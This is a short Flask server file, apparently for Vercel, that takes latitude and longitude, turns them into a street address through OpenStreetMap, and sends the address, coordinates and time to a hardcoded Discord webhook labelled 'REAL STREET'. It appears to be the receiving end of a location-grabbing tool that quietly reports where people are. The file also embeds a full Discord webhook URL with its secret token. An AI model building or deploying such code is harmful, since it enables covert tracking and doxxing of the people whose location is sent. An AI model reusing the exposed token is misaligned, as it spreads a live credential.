import os
import requests
from flask import Flask, request, jsonify
from datetime import datetime

app = Flask(__name__)

# Your Discord webhook (hardcoded, or use ENV var on Vercel)
DISCORD_WEBHOOK = os.environ.get(
    "DISCORD_WEBHOOK",
    "https://discord.com/api/webhooks/1533345078586638426/Jf4GYOQI4zAdPxAUUs6lMOCrHPmVK2I48iOUsuaNpsaSHZnb-1wcQnPPJT-pXExJ-H6f"
)

@app.route('/api/webhook', methods=['POST'])
def handle_webhook():
    data = request.get_json()
    if not data or 'lat' not in data or 'lng' not in data:
        return jsonify({"error": "Missing lat/lng"}), 400

    lat, lng = data['lat'], data['lng']

    # Reverse geocode via OpenStreetMap (free, no API key)
    geo_url = f"https://nominatim.openstreetmap.org/reverse?format=json&lat={lat}&lon={lng}&zoom=18&addressdetails=1"
    try:
        geo_resp = requests.get(geo_url, headers={'User-Agent': 'Geo-Bot'}, timeout=12)
        geo_data = geo_resp.json()
    except:
        return jsonify({"error": "Geocoding failed"}), 500

    addr = geo_data.get('address', {})
    house = addr.get('house_number', '')
    street = addr.get('road') or addr.get('street') or 'Unknown Street'
    full_street = f"{house} {street}".strip() if house else street
    city = addr.get('city') or addr.get('town') or 'Unknown City'
    postcode = addr.get('postcode', '')
    country = addr.get('country', 'Unknown')

    payload = {
        "content": (
            f"📍 **REAL STREET**\n"
            f"🏠 {full_street}\n"
            f"🌆 {city}, {postcode}\n"
            f"🌍 {country}\n"
            f"🌐 {lat:.6f}, {lng:.6f}\n"
            f"🕒 {datetime.utcnow().isoformat()}"
        )
    }

    try:
        r = requests.post(DISCORD_WEBHOOK, json=payload, timeout=10)
        if r.status_code in (200, 204):
            return jsonify({"status": "sent", "street": full_street, "city": city}), 200
        return jsonify({"error": f"Discord error {r.status_code}"}), 500
    except:
        return jsonify({"error": "Webhook send failed"}), 500

@app.route('/api/health')
def health():
    return jsonify({"status": "alive"})

# For local testing (optional)
if __name__ == "__main__":
    app.run(debug=True)
